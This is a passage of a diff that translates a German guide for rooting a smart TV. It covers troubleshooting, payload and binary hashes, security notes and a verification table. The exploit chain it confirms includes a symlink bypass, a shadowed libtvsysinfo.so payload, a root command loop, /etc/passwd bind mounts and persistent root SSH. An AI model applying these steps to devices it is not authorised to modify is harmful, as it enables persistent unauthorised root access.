 kill "$(cat /3rd_rw/appdata/root_loop.pid)" 2>/dev/null
@@ -461,80 +458,80 @@ sync
 reboot
 ```
 
-Der ro Rootfs ist unverändert; die Original-`libtvsysinfo.so` bleibt unter `/3rd_rw/tvsysinfo/lib`. Kein Flash, kein `.pkg`.
+The ro rootfs is unchanged; the original `libtvsysinfo.so` remains under `/3rd_rw/tvsysinfo/lib`. No flash, no `.pkg`.
 
 ---
 
 ## 12. Troubleshooting
 
-| Problem | Ursache / Lösung |
+| Problem | Cause / solution |
 |---|---|
-| `PTY allocation request failed` / `openpty: No space left on device` | `/dev/pts` ist nicht devpts. `mkdir -p /dev/shm/pts; mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts; mount --bind /dev/shm/pts /dev/pts`. Erneut verbinden. |
-| `Permission denied (publickey)` | `grep '^root:' /etc/passwd` muss `/3rd_rw/sshd/home:/bin/sh` zeigen (Bind-Mount). `authorized_keys` 600, `.ssh` 700, Home 700. `cat /3rd_rw/sshd/dropbear.log`. |
-| `Connection refused` | Dropbear läuft nicht: `ps | grep dropbear`, `cat /3rd_rw/sshd/dropbear.log`, `/bin/sh /3rd_rw/sshd/start_sshd.sh`. Port 22: `/proc/net/tcp` (`:0016`). |
-| Host-Key-Warnung | `ssh-keygen -R 192.0.2.94`; Fingerprint `SHA256:7tFL…` bestätigen. |
-| Recon-Seite weg | TV-Browser neu öffnen: `http://<host-ip>:9000/recon.html`. SSH/Root-Loop laufen unabhängig. |
-| Nach Reboot kein SSH | `/3rd_rw/hamservice/HamService` (Wrapper, 755), `/3rd_rw/sshd/start_sshd.sh`, `dropbear.log`, `mount.log` prüfen. `startHam.sh` startet den Wrapper. |
-| Root-User nicht gefunden | `/etc/passwd`-Bind fehlt: `mount --bind /3rd_rw/sshd/etc_passwd /etc/passwd`; `grep '^root:' /etc/passwd`. |
-| Kein Root nach Payload | Datei 33.500 B/SHA prüfen; `/3rd_rw/loglevel/lib/libtvsysinfo.so` vorhanden; Browser neu starten; Index 17. |
-| `dropbear: Invalid option -s` | Dieser Build hat kein `-s`; Passwort-Auth ist **compile-time** aus. `-s` aus dem Startskript entfernen (hier bereits nicht enthalten). |
-| `sh: /usr/libexec/sftp-server: No such file` | Der Dropbear ist noch der ungepatchte. `root/scripts/host/install_sftp.sh` ausführen; prüfen: `grep -a 'sftp-server' /3rd_rw/sshd/dropbear` → `/3rd_rw/sshd/sftp-server`. |
-| SFTP auf 2222 scheitert | `/3rd_rw/sshd/dropbear2222.log` prüfen; Port 22 wurde nicht angefasst. |
-| SFTP auf 22 scheitert | `/3rd_rw/sshd/swap.log`, `/3rd_rw/sshd/dropbear.log`; Rollback-Befehl in 9.4. |
+| `PTY allocation request failed` / `openpty: No space left on device` | `/dev/pts` is not devpts. `mkdir -p /dev/shm/pts; mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts; mount --bind /dev/shm/pts /dev/pts`. Connect again. |
+| `Permission denied (publickey)` | `grep '^root:' /etc/passwd` must show `/3rd_rw/sshd/home:/bin/sh` (bind mount). `authorized_keys` 600, `.ssh` 700, home 700. `cat /3rd_rw/sshd/dropbear.log`. |
+| `Connection refused` | Dropbear is not running: `ps | grep dropbear`, `cat /3rd_rw/sshd/dropbear.log`, `/bin/sh /3rd_rw/sshd/start_sshd.sh`. Port 22: `/proc/net/tcp` (`:0016`). |
+| Host key warning | `ssh-keygen -R 192.0.2.94`; confirm the fingerprint `SHA256:7tFL…`. |
+| Recon page gone | Reopen the TV browser: `http://<host-ip>:9000/recon.html`. SSH/root loop run independently. |
+| No SSH after reboot | Check `/3rd_rw/hamservice/HamService` (wrapper, 755), `/3rd_rw/sshd/start_sshd.sh`, `dropbear.log`, `mount.log`. `startHam.sh` starts the wrapper. |
+| Root user not found | The `/etc/passwd` bind is missing: `mount --bind /3rd_rw/sshd/etc_passwd /etc/passwd`; `grep '^root:' /etc/passwd`. |
+| No root after payload | Check the file 33.500 B/SHA; `/3rd_rw/loglevel/lib/libtvsysinfo.so` present; restart the browser; index 17. |
+| `dropbear: Invalid option -s` | This build has no `-s`; password auth is **compile-time** off. Remove `-s` from the start script (already not included here). |
+| `sh: /usr/libexec/sftp-server: No such file` | The Dropbear is still the unpatched one. Run `root/scripts/host/install_sftp.sh`; check: `grep -a 'sftp-server' /3rd_rw/sshd/dropbear` → `/3rd_rw/sshd/sftp-server`. |
+| SFTP on 2222 fails | Check `/3rd_rw/sshd/dropbear2222.log`; port 22 was not touched. |
+| SFTP on 22 fails | `/3rd_rw/sshd/swap.log`, `/3rd_rw/sshd/dropbear.log`; rollback command in 9.4. |
 
-Dead Ends und verworfene Wege: `../dead-ends.md` (kurz).
+Dead ends and discarded paths: `../dead-ends.md` (brief).
 
 ---
 
-## 13. Artefakte und Hashes
+## 13. Artifacts and hashes
 
-| Artefakt | Pfad | Größe / SHA-256 |
+| Artifact | Path | Size / SHA-256 |
 |---|---|---|
 | Original `libtvsysinfo.so` | `artifacts/tvi_original.so` | 33.220 B / `36ddee4782cdcff7a0f1d94e8b3491ea6fe228d13bfef3ea137a98f142ff3b7c` |
-| Root-Payload | `tools/pub/libtvsysinfo.so` | 33.500 B / `37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a` |
+| Root payload | `tools/pub/libtvsysinfo.so` | 33.500 B / `37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a` |
 | Dropbear | `tools/pub/dropbear` | 882.204 B / `976ec57e401765d5fc9c0a201d19c997c004dcf91a8d4bdb039bbb8419071eae` |
 | Dropbearkey | `tools/pub/dropbearkey` | 755.452 B / `3fbfa60891b3a9f3e971a24071ed4d14c93ee3e773dd6f4969646cc811b0dbbf` |
-| Dropbear-Quelle | `sources/dropbear-2022.83.tar.bz2` | `bc5a121ffbc94b5171ad5ebe01be42746d50aa797c9549a4639894a16749443b` |
-| SFTP-Server | `tools/pub/sftp-server` | 635.680 B / `d0f7700e84e582aef3948c29e4317fb0119e13393374a7455922ffa8d01202f3` |
+| Dropbear source | `sources/dropbear-2022.83.tar.bz2` | `bc5a121ffbc94b5171ad5ebe01be42746d50aa797c9549a4639894a16749443b` |
+| SFTP server | `tools/pub/sftp-server` | 635.680 B / `d0f7700e84e582aef3948c29e4317fb0119e13393374a7455922ffa8d01202f3` |
 | Dropbear (SFTP) | `tools/pub/dropbear-sftp` | 882.204 B / `a21b0d3e53dd1d124105350319df45a2b44e7cef70dd29b418644b11fdcfed57` |
-| OpenSSH-Quelle | `sources/openssh-9.9p1.tar.gz` | `b343fbcdbff87f15b1986e6e15d6d4fc9a7d36066be6b7fb507087ba8f966c02` |
-| Host-Key (SSH) | TV: `/3rd_rw/sshd/host_key` | Ed25519 / `<host-key-fingerprint>` |
-| Dein Auth-Key | `tools/pub/authorized_keys` | Fingerprint `<host-key-fingerprint>` |
-| Root-Proof | TV: `/3rd_rw/root_proof.txt` | `ROOT_EXEC_TVI\n` |
-| Root-Loop | TV: `/3rd_rw/appdata/root_loop.sh` | PID: `/3rd_rw/appdata/root_loop.pid` |
+| OpenSSH source | `sources/openssh-9.9p1.tar.gz` | `b343fbcdbff87f15b1986e6e15d6d4fc9a7d36066be6b7fb507087ba8f966c02` |
+| Host key (SSH) | TV: `/3rd_rw/sshd/host_key` | Ed25519 / `<host-key-fingerprint>` |
+| Your auth key | `tools/pub/authorized_keys` | fingerprint `<host-key-fingerprint>` |
+| Root proof | TV: `/3rd_rw/root_proof.txt` | `ROOT_EXEC_TVI\n` |
+| Root loop | TV: `/3rd_rw/appdata/root_loop.sh` | PID: `/3rd_rw/appdata/root_loop.pid` |
 
-`SHA256SUMS` im Top-Level: `cd <repo-root> && sha256sum -c SHA256SUMS`.
-
----
-
-## 14. Sicherheit / Grenzen
-
-- **SSH ist key-only, root, im LAN.** Kein Passwort-Login; der private Key ist der einzige Zugang. Nicht ins Internet exponieren.
-- **SFTP ist optional und root-equivalent.** Key-only wie SSH; der sftp-server läuft als root. Installation testet zuerst Port 2222; Backup `/3rd_rw/sshd/dropbear.nosftp`; Rollback in 9.4.
-- **Der Root-Loop ist root-equivalent.** Wer `/3rd_rw/appdata/root_cmd.sh` schreiben kann (der Browser läuft als root), kann Root-Befehle ausführen. Gewollt, aber entsprechend behandeln.
-- **Kein Flash, kein `.pkg`, kein Bootloader.** Rootfs und `/3rd` sind squashfs-ro; Änderungen liegen in `/3rd_rw` (rw), `/data` (rw), `/perm` (rw) und in Bind-Mounts.
-- **`/etc/passwd`-Bind** ändert nur die Laufzeit-Sicht (Root-Home/Shell); die ro Originaldatei bleibt unverändert. Ein Reboot ohne Startskript stellt den Originalzustand her.
-- **Persistenz** kommt vom `HamService`-Wrapper (und ggf. `developer.sh`). Der `libtvsysinfo`-Shadow löscht sich selbst.
-- **Firmware-Updates** können Pfade/Verhalten ändern; danach Loader-Reihenfolge, HamService-Hook und `/3rd_rw` prüfen.
-- **Keine Secrets im Ordner:** kein Root-Hash, kein privater SSH-Key. Nur Public Key + Host-Fingerprint.
+`SHA256SUMS` at top level: `cd <repo-root> && sha256sum -c SHA256SUMS`.
 
 ---
 
-## 15. Verifikationsstatus
+## 14. Security / limits
 
-| Punkt | Status |
+- **SSH is key-only, root, in the LAN.** No password login; the private key is the only access. Do not expose it to the internet.
+- **SFTP is optional and root-equivalent.** Key-only like SSH; the sftp-server runs as root. Installation first tests port 2222; backup `/3rd_rw/sshd/dropbear.nosftp`; rollback in 9.4.
+- **The root loop is root-equivalent.** Anyone who can write `/3rd_rw/appdata/root_cmd.sh` (the browser runs as root) can execute root commands. Intended, but treat it accordingly.
+- **No flash, no `.pkg`, no bootloader.** rootfs and `/3rd` are squashfs-ro; changes live in `/3rd_rw` (rw), `/data` (rw), `/perm` (rw) and in bind mounts.
+- **The `/etc/passwd` bind** only changes the runtime view (root home/shell); the ro original file remains unchanged. A reboot without the start script restores the original state.
+- **Persistence** comes from the `HamService` wrapper (and possibly `developer.sh`). The `libtvsysinfo` shadow deletes itself.
+- **Firmware updates** can change paths/behavior; afterwards check loader order, the HamService hook and `/3rd_rw`.
+- **No secrets in the folder:** no root hash, no private SSH key. Only public key + host fingerprint.
+
+---
+
+## 15. Verification status
+
+| Item | Status |
 |---|---|
 | Browser root (UID 0, CapEff full) | **CONFIRMED live** |
-| USB-ext4-Symlink-Bypass | **CONFIRMED live** (`/3rd_rw/root_proof.txt`) |
-| `libtvsysinfo`-Shadow / DT_INIT | **CONFIRMED live** (`ROOT_EXEC_TVI`, Self-Unlink) |
-| Root-Loop / Kommandokanal | **CONFIRMED live** (`uid=0`, `root_out.txt`) |
-| Dropbear-SSH, Port 22 | **CONFIRMED live** (`00000000:0016`) |
-| SSH-Pubkey-Auth als root | **CONFIRMED live** (`Pubkey auth succeeded for 'root'`) |
-| PTY / interaktive Shell | **CONFIRMED live** (Session pts/0; `busybox script` → `uid=0(root)`) |
-| SFTP (optional) | static sftp-server + patched Dropbear; Installer testet 2222 vor 22; **TV-Test nach Install** |
-| Boot-Persistenz (HamService-Wrapper) | eingerichtet; Reboot-Test in dieser Doku beschrieben |
-| Payload-Build reproduzierbar | **CONFIRMED** (`build_tvi_payload.py` → exakt `37b13f…`) |
+| USB ext4 symlink bypass | **CONFIRMED live** (`/3rd_rw/root_proof.txt`) |
+| `libtvsysinfo` shadow / DT_INIT | **CONFIRMED live** (`ROOT_EXEC_TVI`, self-unlink) |
+| Root loop / command channel | **CONFIRMED live** (`uid=0`, `root_out.txt`) |
+| Dropbear SSH, port 22 | **CONFIRMED live** (`00000000:0016`) |
+| SSH pubkey auth as root | **CONFIRMED live** (`Pubkey auth succeeded for 'root'`) |
+| PTY / interactive shell | **CONFIRMED live** (session pts/0; `busybox script` → `uid=0(root)`) |
+| SFTP (optional) | static sftp-server + patched Dropbear; installer tests 2222 before 22; **TV test after install** |
+| Boot persistence (HamService wrapper) | set up; reboot test described in this doc |
+| Payload build reproducible | **CONFIRMED** (`build_tvi_payload.py` → exactly `37b13f…`) |
 
-**Scripts:** `tools/pub/*` ist der ausgelieferte Stand; `scripts/tv/*` die Quelle. `deploy_sshd.sh` entspricht dem manuell live ausgeführten Setup. `prepare_usb.sh`/`start_http.sh`/`plant_payload.js`/`upload_to_appdata.js`/`run_root_cmd.js` sind die Host-/TV-Helfer. `build_dropbear.sh` baut die in `tools/pub` liegenden Binaries reproduzierbar aus `sources/`; `build_sftp_server.sh` baut den statischen sftp-server; `install_sftp.sh` installiert/testet SFTP.
+**Scripts:** `tools/pub/*` is the shipped state; `scripts/tv/*` the source. `deploy_sshd.sh` matches the manually executed live setup. `prepare_usb.sh`/`start_http.sh`/`plant_payload.js`/`upload_to_appdata.js`/`run_root_cmd.js` are the host/TV helpers. `build_dropbear.sh` rebuilds the binaries in `tools/pub` reproducibly from `sources/`; `build_sftp_server.sh` builds the static sftp-server; `install_sftp.sh` installs/tests SFTP.
 
-Viel Erfolg. Und: erst backupen, dann modden. :)
+Good luck. And: back up first, then mod. :)
